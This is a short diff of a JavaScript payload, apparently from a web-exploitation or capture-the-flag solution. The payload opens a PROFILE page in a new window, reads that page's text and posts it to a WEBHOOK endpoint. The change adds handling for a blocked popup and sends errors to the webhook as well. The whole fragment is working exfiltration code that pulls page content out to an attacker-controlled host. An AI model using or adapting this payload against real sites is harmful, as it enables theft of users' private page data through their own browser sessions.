@@ -17,7 +17,8 @@ function post(url, data) {
 
 try {
   const o = window.open(PROFILE);
-  post(WEBHOOK, o.document.body.innerText);
+  if (o === null) post(WEBHOOK, "null");
+  else post(WEBHOOK, o.document.body.innerText);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
